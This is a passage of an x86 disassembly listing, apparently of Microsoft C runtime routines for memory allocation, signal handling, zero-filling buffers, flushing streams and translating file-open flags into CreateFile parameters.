                                        ; sub_41980B+9A↑j
                cmp     [ebp+var_4], ebx
                jb      short loc_4198A7
                xor     eax, eax

loc_4198BD:                             ; CODE XREF: sub_41980B+BE↓j
                pop     edi

loc_4198BE:                             ; CODE XREF: sub_41980B+14↑j
                pop     ebx
                leave
                retn
; ---------------------------------------------------------------------------

loc_4198C1:                             ; CODE XREF: sub_41980B+A0↑j
                                        ; sub_41980B+A4↑j
                movzx   eax, byte ptr [eax]
                movzx   ecx, byte ptr [ecx]

loc_4198C7:                             ; CODE XREF: sub_41980B+74↑j
                                        ; sub_41980B+7E↑j ...
                sub     eax, ecx
                jmp     short loc_4198BD
sub_41980B      endp

; ---------------------------------------------------------------------------
                align 10h
                push    ebp
                mov     ebp, esp
                push    esi
                xor     eax, eax
                push    eax
                push    eax
                push    eax
                push    eax
                push    eax
                push    eax
                push    eax
                push    eax
                mov     edx, [ebp+0Ch]
                lea     ecx, [ecx+0]

loc_4198E4:                             ; CODE XREF: .text:004198F1↓j
                mov     al, [edx]
                or      al, al
                jz      short loc_4198F3
                add     edx, 1
                bts     [esp], eax
                jmp     short loc_4198E4
; ---------------------------------------------------------------------------

loc_4198F3:                             ; CODE XREF: .text:004198E8↑j
                mov     esi, [ebp+8]
                mov     edi, edi

loc_4198F8:                             ; CODE XREF: .text:00419905↓j
                mov     al, [esi]
                or      al, al
                jz      short loc_41990A
                add     esi, 1
                bt      [esp], eax
                jnb     short loc_4198F8
                lea     eax, [esi-1]

loc_41990A:                             ; CODE XREF: .text:004198FC↑j
                add     esp, 20h
                pop     esi
                leave
                retn
; ---------------------------------------------------------------------------
                mov     eax, [esp+8]
                mov     ecx, [esp+10h]
                or      ecx, eax
                mov     ecx, [esp+0Ch]
                jnz     short loc_419929
                mov     eax, [esp+4]
                mul     ecx
                retn    10h
; ---------------------------------------------------------------------------

loc_419929:                             ; CODE XREF: .text:0041991E↑j
                push    ebx
                mul     ecx
                mov     ebx, eax
                mov     eax, [esp+8]
                mul     dword ptr [esp+14h]
                add     ebx, eax
                mov     eax, [esp+8]
                mul     ecx
                add     edx, ebx
                pop     ebx
                retn    10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_419944      proc near               ; CODE XREF: sub_412BF8+11↑p

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                push    0Ch
                push    offset stru_4231C8
                call    __SEH_prolog4
                mov     ecx, [ebp+arg_0]
                xor     edi, edi
                cmp     ecx, edi
                jbe     short loc_419987
                push    0FFFFFFE0h
                pop     eax
                xor     edx, edx
                div     ecx
                cmp     eax, [ebp+arg_4]
                sbb     eax, eax
                inc     eax
                jnz     short loc_419987
                call    sub_41090E
                mov     dword ptr [eax], 0Ch
                push    edi
                push    edi
                push    edi
                push    edi
                push    edi
                call    sub_40EC54
                add     esp, 14h

loc_419980:                             ; CODE XREF: sub_419944+E6↓j
                                        ; sub_419944+F2↓j
                xor     eax, eax
                jmp     loc_419A5C
; ---------------------------------------------------------------------------

loc_419987:                             ; CODE XREF: sub_419944+13↑j
                                        ; sub_419944+22↑j
                imul    ecx, [ebp+arg_4]
                mov     esi, ecx
                mov     [ebp+arg_0], esi
                cmp     esi, edi
                jnz     short loc_419997
                xor     esi, esi
                inc     esi

loc_419997:                             ; CODE XREF: sub_419944+4E↑j
                                        ; sub_419944+DB↓j
                xor     ebx, ebx
                mov     [ebp+var_1C], ebx
                cmp     esi, 0FFFFFFE0h
                ja      short loc_419A0A
                cmp     dword_42C9E8, 3
                jnz     short loc_4199F5
                add     esi, 0Fh
                and     esi, 0FFFFFFF0h
                mov     [ebp+arg_4], esi
                mov     eax, [ebp+arg_0]
                cmp     eax, dword_42C9D8
                ja      short loc_4199F5
                push    4
                call    sub_416913
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], edi
                push    [ebp+arg_0]
                call    sub_417125
                pop     ecx
                mov     [ebp+var_1C], eax
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_419A40
; ---------------------------------------------------------------------------

loc_4199E1:                             ; CODE XREF: sub_419944+104↓j
                mov     ebx, [ebp+var_1C]
                cmp     ebx, edi
                jz      short loc_4199F9
                push    [ebp+arg_0]
                push    edi
                push    ebx
                call    sub_413520
                add     esp, 0Ch

loc_4199F5:                             ; CODE XREF: sub_419944+64↑j
                                        ; sub_419944+78↑j
                cmp     ebx, edi
                jnz     short loc_419A5A

loc_4199F9:                             ; CODE XREF: sub_419944+A2↑j
                push    esi             ; dwBytes
                push    8               ; dwFlags
                push    hHeap           ; hHeap
                call    ds:HeapAlloc
                mov     ebx, eax

loc_419A0A:                             ; CODE XREF: sub_419944+5B↑j
                cmp     ebx, edi
                jnz     short loc_419A5A
                cmp     dword_42B31C, edi
                jz      short loc_419A49
                push    esi
                call    sub_416137
                pop     ecx
                test    eax, eax
                jnz     loc_419997
                mov     eax, [ebp+arg_8]
                cmp     eax, edi
                jz      loc_419980
                mov     dword ptr [eax], 0Ch
                jmp     loc_419980
; ---------------------------------------------------------------------------

loc_419A3B:                             ; DATA XREF: .rdata:stru_4231C8↓o
                xor     edi, edi
                mov     esi, [ebp+arg_4]

loc_419A40:                             ; CODE XREF: sub_419944+98↑j
                push    4
                call    sub_416839
                pop     ecx
                retn
; ---------------------------------------------------------------------------

loc_419A49:                             ; CODE XREF: sub_419944+D0↑j
                cmp     ebx, edi
                jnz     short loc_419A5A
                mov     eax, [ebp+arg_8]
                cmp     eax, edi
                jz      short loc_419A5A
                mov     dword ptr [eax], 0Ch

loc_419A5A:                             ; CODE XREF: sub_419944+B3↑j
                                        ; sub_419944+C8↑j ...
                mov     eax, ebx

loc_419A5C:                             ; CODE XREF: sub_419944+3E↑j
                call    __SEH_epilog4
                retn
sub_419944      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_419A62      proc near               ; CODE XREF: sub_41301F+29↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     dword_42B440, eax
                mov     dword_42B444, eax
                mov     dword_42B448, eax
                mov     dword_42B44C, eax
                pop     ebp
                retn
sub_419A62      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_419A80      proc near               ; CODE XREF: sub_419AC4+5A↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, dword_4257F0
                push    esi

loc_419A8F:                             ; CODE XREF: sub_419A80+21↓j
                cmp     [eax+4], edx
                jz      short loc_419AA3
                mov     esi, ecx
                imul    esi, 0Ch
                add     esi, [ebp+arg_0]
                add     eax, 0Ch
                cmp     eax, esi
                jb      short loc_419A8F

loc_419AA3:                             ; CODE XREF: sub_419A80+12↑j
                imul    ecx, 0Ch
                add     ecx, [ebp+arg_0]
                pop     esi
                cmp     eax, ecx
                jnb     short loc_419AB3
                cmp     [eax+4], edx
                jz      short loc_419AB5

loc_419AB3:                             ; CODE XREF: sub_419A80+2C↑j
                xor     eax, eax

loc_419AB5:                             ; CODE XREF: sub_419A80+31↑j
                pop     ebp
                retn
sub_419A80      endp


; =============== S U B R O U T I N E =======================================


sub_419AB7      proc near               ; CODE XREF: sub_41C890:loc_41C8B7↓p
                push    dword_42B448
                call    sub_41217C
                pop     ecx
                retn
sub_419AB7      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_419AC4      proc near               ; CODE XREF: sub_41C890+32↓p

var_30          = dword ptr -30h
var_2C          = dword ptr -2Ch
var_28          = dword ptr -28h
var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8

                push    20h
                push    offset stru_4231E8
                call    __SEH_prolog4
                xor     edi, edi
                mov     [ebp+var_1C], edi
                mov     [ebp+var_28], edi
                mov     ebx, [ebp+arg_0]
                cmp     ebx, 0Bh
                jg      short loc_419B2C
                jz      short loc_419AF7
                mov     eax, ebx
                push    2
                pop     ecx
                sub     eax, ecx
                jz      short loc_419B0D
                sub     eax, ecx
                jz      short loc_419AF7
                sub     eax, ecx
                jz      short loc_419B57
                sub     eax, ecx
                jnz     short loc_419B3B

loc_419AF7:                             ; CODE XREF: sub_419AC4+1C↑j
                                        ; sub_419AC4+29↑j
                call    sub_41238C
                mov     edi, eax
                mov     [ebp+var_28], edi
                test    edi, edi
                jnz     short loc_419B19

loc_419B05:                             ; CODE XREF: sub_419AC4+91↓j
                or      eax, 0FFFFFFFFh
                jmp     loc_419C6E
; ---------------------------------------------------------------------------

loc_419B0D:                             ; CODE XREF: sub_419AC4+25↑j
                mov     esi, offset dword_42B440
                mov     eax, dword_42B440
                jmp     short loc_419B79
; ---------------------------------------------------------------------------

loc_419B19:                             ; CODE XREF: sub_419AC4+3F↑j
                push    dword ptr [edi+5Ch]
                mov     edx, ebx
                call    sub_419A80
                mov     esi, eax
                add     esi, 8
                mov     eax, [esi]
                jmp     short loc_419B86
; ---------------------------------------------------------------------------

loc_419B2C:                             ; CODE XREF: sub_419AC4+1A↑j
                mov     eax, ebx
                sub     eax, 0Fh
                jz      short loc_419B6F
                sub     eax, 6
                jz      short loc_419B63
                dec     eax
                jz      short loc_419B57

loc_419B3B:                             ; CODE XREF: sub_419AC4+31↑j
                call    sub_41090E
                mov     dword ptr [eax], 16h
                xor     eax, eax
                push    eax
                push    eax
                push    eax
                push    eax
                push    eax
                call    sub_40EC54
                add     esp, 14h
                jmp     short loc_419B05
; ---------------------------------------------------------------------------

loc_419B57:                             ; CODE XREF: sub_419AC4+2D↑j
                                        ; sub_419AC4+75↑j
                mov     esi, offset dword_42B448
                mov     eax, dword_42B448
                jmp     short loc_419B79
; ---------------------------------------------------------------------------

loc_419B63:                             ; CODE XREF: sub_419AC4+72↑j
                mov     esi, offset dword_42B444
                mov     eax, dword_42B444
                jmp     short loc_419B79
; ---------------------------------------------------------------------------

loc_419B6F:                             ; CODE XREF: sub_419AC4+6D↑j
                mov     esi, offset dword_42B44C
                mov     eax, dword_42B44C

loc_419B79:                             ; CODE XREF: sub_419AC4+53↑j
                                        ; sub_419AC4+9D↑j ...
                mov     [ebp+var_1C], 1
                push    eax
                call    sub_41217C

loc_419B86:                             ; CODE XREF: sub_419AC4+66↑j
                mov     [ebp+var_20], eax
                pop     ecx
                xor     eax, eax
                cmp     [ebp+var_20], 1
                jz      loc_419C6E
                cmp     [ebp+var_20], eax
                jnz     short loc_419BA2
                push    3               ; uExitCode
                call    sub_412FEB

loc_419BA2:                             ; CODE XREF: sub_419AC4+D5↑j
                cmp     [ebp+var_1C], eax
                jz      short loc_419BAE
                push    eax
                call    sub_416913
                pop     ecx

loc_419BAE:                             ; CODE XREF: sub_419AC4+E1↑j
                xor     eax, eax
                mov     [ebp+ms_exc.registration.TryLevel], eax
                cmp     ebx, 8
                jz      short loc_419BC2
                cmp     ebx, 0Bh
                jz      short loc_419BC2
                cmp     ebx, 4
                jnz     short loc_419BDD

loc_419BC2:                             ; CODE XREF: sub_419AC4+F2↑j
                                        ; sub_419AC4+F7↑j
                mov     ecx, [edi+60h]
                mov     [ebp+var_2C], ecx
                mov     [edi+60h], eax
                cmp     ebx, 8
                jnz     short loc_419C10
                mov     ecx, [edi+64h]
                mov     [ebp+var_30], ecx
                mov     dword ptr [edi+64h], 8Ch

loc_419BDD:                             ; CODE XREF: sub_419AC4+FC↑j
                cmp     ebx, 8
                jnz     short loc_419C10
                mov     ecx, dword_4257E4
                mov     [ebp+var_24], ecx

loc_419BEB:                             ; CODE XREF: sub_419AC4+14A↓j
                mov     ecx, dword_4257E8
                mov     edx, dword_4257E4
                add     ecx, edx
                cmp     [ebp+var_24], ecx
                jge     short loc_419C17
                mov     ecx, [ebp+var_24]
                imul    ecx, 0Ch
                mov     edx, [edi+5Ch]
                mov     [ecx+edx+8], eax
                inc     [ebp+var_24]
                jmp     short loc_419BEB
; ---------------------------------------------------------------------------

loc_419C10:                             ; CODE XREF: sub_419AC4+10A↑j
                                        ; sub_419AC4+11C↑j
                call    sub_412173
                mov     [esi], eax

loc_419C17:                             ; CODE XREF: sub_419AC4+138↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_419C38
; ---------------------------------------------------------------------------

loc_419C23:                             ; CODE XREF: sub_419AC4:loc_419C46↓j
                cmp     ebx, 8
                jnz     short loc_419C47
                push    dword ptr [edi+64h]
                push    ebx
                call    [ebp+var_20]
                pop     ecx
                jmp     short loc_419C4B
; ---------------------------------------------------------------------------

loc_419C32:                             ; DATA XREF: .rdata:stru_4231E8↓o
                mov     ebx, [ebp+8]
                mov     edi, [ebp+var_28]

loc_419C38:                             ; CODE XREF: sub_419AC4+15A↑j
                cmp     [ebp+var_1C], 0
                jz      short loc_419C46
                push    0
                call    sub_416839
                pop     ecx

loc_419C46:                             ; CODE XREF: sub_419AC4+178↑j
                retn
; ---------------------------------------------------------------------------

loc_419C47:                             ; CODE XREF: sub_419AC4+162↑j
                push    ebx
                call    [ebp+var_20]

loc_419C4B:                             ; CODE XREF: sub_419AC4+16C↑j
                pop     ecx
                cmp     ebx, 8
                jz      short loc_419C5B
                cmp     ebx, 0Bh
                jz      short loc_419C5B
                cmp     ebx, 4
                jnz     short loc_419C6C

loc_419C5B:                             ; CODE XREF: sub_419AC4+18B↑j
                                        ; sub_419AC4+190↑j
                mov     eax, [ebp+var_2C]
                mov     [edi+60h], eax
                cmp     ebx, 8
                jnz     short loc_419C6C
                mov     eax, [ebp+var_30]
                mov     [edi+64h], eax

loc_419C6C:                             ; CODE XREF: sub_419AC4+195↑j
                                        ; sub_419AC4+1A0↑j
                xor     eax, eax

loc_419C6E:                             ; CODE XREF: sub_419AC4+44↑j
                                        ; sub_419AC4+CC↑j
                call    __SEH_epilog4
                retn
sub_419AC4      endp ; sp-analysis failed


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_419C74      proc near               ; CODE XREF: sub_41301F+23↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     dword_42B454, eax
                pop     ebp
                retn
sub_419C74      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_419C83      proc near               ; CODE XREF: sub_41301F+1D↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     dword_42B460, eax
                pop     ebp
                retn
sub_419C83      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_419C92      proc near               ; CODE XREF: sub_41301F+11↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     dword_42B464, eax
                pop     ebp
                retn
sub_419C92      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_419CA1(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount)
sub_419CA1      proc near               ; CODE XREF: sub_413A18+C0↑p
                                        ; sub_415257+173↑p ...

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
lpCriticalSection= dword ptr  8
dwSpinCount     = dword ptr  0Ch

                push    10h
                push    offset stru_423208
                call    __SEH_prolog4
                and     [ebp+ms_exc.registration.TryLevel], 0
                push    [ebp+dwSpinCount] ; dwSpinCount
                push    [ebp+lpCriticalSection] ; lpCriticalSection
                call    ds:InitializeCriticalSectionAndSpinCount
                mov     [ebp+var_1C], eax
                jmp     short loc_419CF1
; ---------------------------------------------------------------------------

loc_419CC2:                             ; DATA XREF: .rdata:stru_423208↓o
                mov     eax, [ebp+ms_exc.exc_ptr]
                mov     eax, [eax]
                mov     eax, [eax]
                mov     [ebp+var_20], eax
                xor     ecx, ecx
                cmp     eax, 0C0000017h
                setz    cl
                mov     eax, ecx
                retn
; ---------------------------------------------------------------------------

loc_419CD9:                             ; DATA XREF: .rdata:stru_423208↓o
                mov     esp, [ebp+ms_exc.old_esp]
                cmp     [ebp+var_20], 0C0000017h
                jnz     short loc_419CED
                push    8               ; dwErrCode
                call    ds:SetLastError

loc_419CED:                             ; CODE XREF: sub_419CA1+42↑j
                and     [ebp+var_1C], 0

loc_419CF1:                             ; CODE XREF: sub_419CA1+1F↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                mov     eax, [ebp+var_1C]
                call    __SEH_epilog4
                retn
sub_419CA1      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_419D01      proc near               ; CODE XREF: sub_419D58+31↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                push    ebp
                mov     ebp, esp
                sub     esp, 4
                mov     [ebp+var_4], edi
                mov     edi, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                shr     ecx, 7
                pxor    xmm0, xmm0
                jmp     short loc_419D21
; ---------------------------------------------------------------------------
                db 8Dh, 0A4h, 24h, 4 dup(0)
                db 90h
; ---------------------------------------------------------------------------

loc_419D21:                             ; CODE XREF: sub_419D01+16↑j
                                        ; sub_419D01+4E↓j
                movdqa  xmmword ptr [edi], xmm0
                movdqa  xmmword ptr [edi+10h], xmm0
                movdqa  xmmword ptr [edi+20h], xmm0
                movdqa  xmmword ptr [edi+30h], xmm0
                movdqa  xmmword ptr [edi+40h], xmm0
                movdqa  xmmword ptr [edi+50h], xmm0
                movdqa  xmmword ptr [edi+60h], xmm0
                movdqa  xmmword ptr [edi+70h], xmm0
                lea     edi, [edi+80h]
                dec     ecx
                jnz     short loc_419D21
                mov     edi, [ebp+var_4]
                mov     esp, ebp
                pop     ebp
                retn
sub_419D01      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_419D58      proc near               ; CODE XREF: sub_413520+27↑j
                                        ; sub_419D58+7D↓p

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_8           = dword ptr  10h

                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                mov     [ebp+var_4], edi
                mov     eax, [ebp+arg_0]
                cdq
                mov     edi, eax
                xor     edi, edx
                sub     edi, edx
                and     edi, 0Fh
                xor     edi, edx
                sub     edi, edx
                test    edi, edi
                jnz     short loc_419DB2
                mov     ecx, [ebp+arg_8]
                mov     edx, ecx
                and     edx, 7Fh
                mov     [ebp+var_C], edx
                cmp     ecx, edx
                jz      short loc_419D97
                sub     ecx, edx
                push    ecx
                push    eax
                call    sub_419D01
                add     esp, 8
                mov     eax, [ebp+arg_0]
                mov     edx, [ebp+var_C]

loc_419D97:                             ; CODE XREF: sub_419D58+2B↑j
                test    edx, edx
                jz      short loc_419DE0
                add     eax, [ebp+arg_8]
                sub     eax, edx
                mov     [ebp+var_8], eax
                xor     eax, eax
                mov     edi, [ebp+var_8]
                mov     ecx, [ebp+var_C]
                rep stosb
                mov     eax, [ebp+arg_0]
                jmp     short loc_419DE0
; ---------------------------------------------------------------------------

loc_419DB2:                             ; CODE XREF: sub_419D58+1C↑j
                neg     edi
                add     edi, 10h
                mov     [ebp+var_10], edi
                xor     eax, eax
                mov     edi, [ebp+arg_0]
                mov     ecx, [ebp+var_10]
                rep stosb
                mov     eax, [ebp+var_10]
                mov     ecx, [ebp+arg_0]
                mov     edx, [ebp+arg_8]
                add     ecx, eax
                sub     edx, eax
                push    edx
                push    0
                push    ecx
                call    sub_419D58
                add     esp, 0Ch
                mov     eax, [ebp+arg_0]

loc_419DE0:                             ; CODE XREF: sub_419D58+41↑j
                                        ; sub_419D58+58↑j
                mov     edi, [ebp+var_4]
                mov     esp, ebp
                pop     ebp
                retn
sub_419D58      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_419DE7      proc near               ; CODE XREF: sub_413651+E↑p

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h

                push    10h
                push    offset stru_423228
                call    __SEH_prolog4
                xor     ebx, ebx
                mov     [ebp+var_1C], ebx
                push    1
                call    sub_416913
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], ebx
                push    3
                pop     edi

loc_419E06:                             ; CODE XREF: sub_419DE7+7F↓j
                mov     [ebp+var_20], edi
                cmp     edi, dword_42DB20
                jge     short loc_419E68
                mov     esi, edi
                shl     esi, 2
                mov     eax, dword_42CB00
                add     eax, esi
                cmp     [eax], ebx
                jz      short loc_419E65
                mov     eax, [eax]
                test    byte ptr [eax+0Ch], 83h
                jz      short loc_419E38
                push    eax
                call    sub_40F867
                pop     ecx
                cmp     eax, 0FFFFFFFFh
                jz      short loc_419E38
                inc     [ebp+var_1C]

loc_419E38:                             ; CODE XREF: sub_419DE7+40↑j
                                        ; sub_419DE7+4C↑j
                cmp     edi, 14h
                jl      short loc_419E65
                mov     eax, dword_42CB00
                mov     eax, [esi+eax]
                add     eax, 20h
                push    eax             ; lpCriticalSection
                call    ds:DeleteCriticalSection
                mov     eax, dword_42CB00
                push    dword ptr [esi+eax] ; lpMem
                call    sub_40FD55
                pop     ecx
                mov     eax, dword_42CB00
                mov     [esi+eax], ebx

loc_419E65:                             ; CODE XREF: sub_419DE7+38↑j
                                        ; sub_419DE7+54↑j
                inc     edi
                jmp     short loc_419E06
; ---------------------------------------------------------------------------

loc_419E68:                             ; CODE XREF: sub_419DE7+28↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_419E7D
; ---------------------------------------------------------------------------

loc_419E74:                             ; CODE XREF: sub_419DE7+9E↓j
                mov     eax, [ebp+var_1C]
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_419E7D:                             ; CODE XREF: sub_419DE7+88↑j
                                        ; DATA XREF: .rdata:stru_423228↓o
                push    1
                call    sub_416839
                pop     ecx
                retn
sub_419DE7      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_419E86(int, LPCSTR lpFileName, int, int, int)
sub_419E86      proc near               ; CODE XREF: sub_41A5A5+72↓p

SecurityAttributes= _SECURITY_ATTRIBUTES ptr -30h
var_20          = dword ptr -20h
hFile           = dword ptr -1Ch
var_18          = dword ptr -18h
dwCreationDisposition= dword ptr -14h
dwShareMode     = dword ptr -10h
dwFlagsAndAttributes= dword ptr -0Ch
dwDesiredAccess = dword ptr -8
Buffer          = byte ptr -4
var_3           = byte ptr -3
var_2           = byte ptr -2
var_1           = byte ptr -1
arg_0           = dword ptr  8
lpFileName      = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 30h
                push    ebx
                xor     ebx, ebx
                test    byte ptr [ebp+arg_8], 80h
                push    esi
                push    edi
                mov     esi, eax
                mov     [ebp+var_20], ebx
                mov     [ebp+var_2], bl
                mov     [ebp+SecurityAttributes.nLength], 0Ch
                mov     [ebp+SecurityAttributes.lpSecurityDescriptor], ebx
                jz      short loc_419EB4
                mov     [ebp+SecurityAttributes.bInheritHandle], ebx
                mov     [ebp+var_1], 10h
                jmp     short loc_419EBE
; ---------------------------------------------------------------------------

loc_419EB4:                             ; CODE XREF: sub_419E86+23↑j
                mov     [ebp+SecurityAttributes.bInheritHandle], 1
                mov     [ebp+var_1], bl

loc_419EBE:                             ; CODE XREF: sub_419E86+2C↑j
                lea     eax, [ebp+var_20]
                push    eax
                call    sub_41CEDE
                pop     ecx
                test    eax, eax
                jz      short loc_419ED9
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                call    sub_40EB2C
                add     esp, 14h

loc_419ED9:                             ; CODE XREF: sub_419E86+44↑j
                mov     ecx, [ebp+arg_8]
                mov     eax, 8000h
                test    eax, ecx
                jnz     short loc_419EF6
                test    ecx, 74000h
                jnz     short loc_419EF2
                cmp     [ebp+var_20], eax
                jz      short loc_419EF6

loc_419EF2:                             ; CODE XREF: sub_419E86+65↑j
                or      [ebp+var_1], 80h

loc_419EF6:                             ; CODE XREF: sub_419E86+5D↑j
                                        ; sub_419E86+6A↑j
                mov     eax, ecx
                and     eax, 3
                sub     eax, ebx
                mov     edx, 0C0000000h
                mov     edi, 80000000h
                jz      short loc_419F50
                dec     eax
                jz      short loc_419F3A
                dec     eax
                jz      short loc_419F35

loc_419F0F:                             ; CODE XREF: sub_419E86+E6↓j
                                        ; sub_419E86+143↓j ...
                call    sub_410921
                mov     [eax], ebx
                or      dword ptr [esi], 0FFFFFFFFh
                call    sub_41090E
                push    16h
                pop     esi
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     [eax], esi
                call    sub_40EC54
                add     esp, 14h
                jmp     loc_41A435
; ---------------------------------------------------------------------------

loc_419F35:                             ; CODE XREF: sub_419E86+87↑j
                                        ; sub_419E86+BF↓j
                mov     [ebp+dwDesiredAccess], edx
                jmp     short loc_419F53
; ---------------------------------------------------------------------------

loc_419F3A:                             ; CODE XREF: sub_419E86+84↑j
                test    cl, 8
                jz      short loc_419F47
                test    ecx, 70000h
                jnz     short loc_419F35

loc_419F47:                             ; CODE XREF: sub_419E86+B7↑j
                mov     [ebp+dwDesiredAccess], 40000000h
                jmp     short loc_419F53
; ---------------------------------------------------------------------------

loc_419F50:                             ; CODE XREF: sub_419E86+81↑j
                mov     [ebp+dwDesiredAccess], edi

loc_419F53:                             ; CODE XREF: sub_419E86+B2↑j
                                        ; sub_419E86+C8↑j
                mov     eax, [ebp+arg_C]
                push    10h
                pop     ecx
                sub     eax, ecx
                jz      short loc_419F94
                sub     eax, ecx
                jz      short loc_419F8B
                sub     eax, ecx
                jz      short loc_419F82
                sub     eax, ecx
                jz      short loc_419F79
                sub     eax, 40h
                jnz     short loc_419F0F
                cmp     [ebp+dwDesiredAccess], edi
                setz    al
                mov     [ebp+dwShareMode], eax
                jmp     short loc_419F97
; ---------------------------------------------------------------------------

loc_419F79:                             ; CODE XREF: sub_419E86+E1↑j
                mov     [ebp+dwShareMode], 3
                jmp     short loc_419F97
; ---------------------------------------------------------------------------

loc_419F82:                             ; CODE XREF: sub_419E86+DD↑j
                mov     [ebp+dwShareMode], 2
                jmp     short loc_419F97
; ---------------------------------------------------------------------------

loc_419F8B:                             ; CODE XREF: sub_419E86+D9↑j
                mov     [ebp+dwShareMode], 1
                jmp     short loc_419F97
; ---------------------------------------------------------------------------

loc_419F94:                             ; CODE XREF: sub_419E86+D5↑j
                mov     [ebp+dwShareMode], ebx

loc_419F97:                             ; CODE XREF: sub_419E86+F1↑j
                                        ; sub_419E86+FA↑j ...
                mov     eax, [ebp+arg_8]
                mov     edx, 700h
                and     eax, edx
                mov     ecx, 400h
                cmp     eax, ecx
                mov     edi, 100h
                jg      short loc_419FEA
                jz      short loc_419FE1
                cmp     eax, ebx
                jz      short loc_419FE1
                cmp     eax, edi
                jz      short loc_419FD8
                cmp     eax, 200h
                jz      loc_41A058
                cmp     eax, 300h
                jnz     loc_419F0F
                mov     [ebp+dwCreationDisposition], 2
                jmp     short loc_41A007
; ---------------------------------------------------------------------------

loc_419FD8:                             ; CODE XREF: sub_419E86+131↑j
                mov     [ebp+dwCreationDisposition], 4
                jmp     short loc_41A007
; ---------------------------------------------------------------------------

loc_419FE1:                             ; CODE XREF: sub_419E86+129↑j
                                        ; sub_419E86+12D↑j
                mov     [ebp+dwCreationDisposition], 3
                jmp     short loc_41A007
; ---------------------------------------------------------------------------

loc_419FEA:                             ; CODE XREF: sub_419E86+127↑j
                cmp     eax, 500h
                jz      short loc_41A000
                cmp     eax, 600h
                jz      short loc_41A058
                cmp     eax, edx
                jnz     loc_419F0F

loc_41A000:                             ; CODE XREF: sub_419E86+169↑j
                mov     [ebp+dwCreationDisposition], 1

loc_41A007:                             ; CODE XREF: sub_419E86+150↑j
                                        ; sub_419E86+159↑j ...
                mov     eax, [ebp+arg_8]
                mov     [ebp+dwFlagsAndAttributes], 80h
                test    edi, eax
                jz      short loc_41A02B
                mov     ecx, dword_42AE58
                not     ecx
                and     ecx, [ebp+arg_10]
                test    cl, cl
                js      short loc_41A02B
                mov     [ebp+dwFlagsAndAttributes], 1

loc_41A02B:                             ; CODE XREF: sub_419E86+18D↑j
                                        ; sub_419E86+19C↑j
                test    al, 40h
                jz      short loc_41A041
                or      [ebp+dwFlagsAndAttributes], 4000000h
                or      [ebp+dwDesiredAccess], 10000h
                or      [ebp+dwShareMode], 4

loc_41A041:                             ; CODE XREF: sub_419E86+1A7↑j
                test    eax, 1000h
                jz      short loc_41A04B
                or      [ebp+dwFlagsAndAttributes], edi

loc_41A04B:                             ; CODE XREF: sub_419E86+1C0↑j
                test    al, 20h
                jz      short loc_41A061
                or      [ebp+dwFlagsAndAttributes], 8000000h
                jmp     short loc_41A06C
; ---------------------------------------------------------------------------

loc_41A058:                             ; CODE XREF: sub_419E86+138↑j
                                        ; sub_419E86+170↑j
                mov     [ebp+dwCreationDisposition], 5
                jmp     short loc_41A007
; ---------------------------------------------------------------------------

loc_41A061:                             ; CODE XREF: sub_419E86+1C7↑j
                test    al, 10h
                jz      short loc_41A06C
                or      [ebp+dwFlagsAndAttributes], 10000000h

loc_41A06C:                             ; CODE XREF: sub_419E86+1D0↑j
                                        ; sub_419E86+1DD↑j
                call    sub_4163A4
                mov     [esi], eax
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_41A092
                call    sub_410921
                mov     [eax], ebx
                or      dword ptr [esi], 0FFFFFFFFh
                call    sub_41090E
